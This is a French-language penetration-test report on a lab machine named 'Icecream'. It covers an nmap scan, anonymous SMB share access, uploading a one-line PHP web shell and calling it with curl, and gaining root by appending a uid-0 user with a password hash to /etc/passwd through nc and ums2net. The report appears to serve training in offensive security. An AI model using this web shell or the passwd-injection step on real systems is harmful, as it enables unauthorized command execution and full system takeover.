# Rapport de Vulnérabilité : Icecream

## Introduction

### Objectif
Identifier et exploiter les failles de sécurité de la machine cible "Icecream".

### Informations sur les IP
- **IP cible :** `192.168.188.214`
- **IP Kali :** `192.168.188.128`

## Découverte et Analyse Initiale des Services

### Scan Nmap
#### Commandes exécutées
Définition de la variable IP cible et exécution d'un scan Nmap pour détecter les services et versions.

```bash
target=192.168.188.214
nmap -T4 -p$(nmap -Pn -T4 -n -p- $target | grep 'tcp.*open' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -Pn -n -sVC $target
```

### Analyse des services ouverts
Liste des ports ouverts et des services associés avec leurs versions respectives.

## Potentielles Pistes d'Exploitation

### Exploitation des Ports SMB
Analyse des vulnérabilités potentielles des ports 139 & 445 associés au service Samba 4.6.2.

#### Tests de connexion SMB
Utilisation de `smbclient` pour tester l'accès aux partages sans mot de passe et examiner les contenus des fichiers partagés.

```bash
smbclient -L //192.168.188.214 -N
smbclient //192.168.188.214/icecream -N
put shell.php
```

### Mise en place d'un Web Shell
Instructions pour la création et le déploiement d'un web shell via SMB pour exécuter des commandes à distance.

```bash
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
curl "http://192.168.188.214/shell.php?cmd=id"
```

## Élévation de Privilèges

### Utilisation de Linpeas et PSPY
Description et utilisation des outils Linpeas et PSPY pour l'analyse des processus et la détection de vulnérabilités d'élévation de privilèges.

```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Exploitation de CVE-2021-3156
Analyse de la possibilité d'exploiter cette vulnérabilité d'élévation de privilège.

### Utilisation de ums2net pour l'élévation de privilèges
Procédure détaillée pour utiliser ums2net afin de modifier `/etc/passwd` et ajouter un utilisateur avec les droits root.

```bash
echo 'aurelien:$6$IPVFVjVKK55o19kF$XqJHT3H5Qcmk96/iaLUfcC3UQPEYF0yFGzRtTinb/9NfQZIpWed9UfA6YBaEWhE5TRc1MLaXgLHWUtYI010Pj1:0:0:aurelien:/home/aurelien:/bin/bash' >> passwd
nc -v 192.168.188.214 5000 < ./passwd
sudo /usr/sbin/ums2net -c /tmp/config -d
```

## Conclusion

Synthèse des résultats et confirmation de l'accès root obtenue.
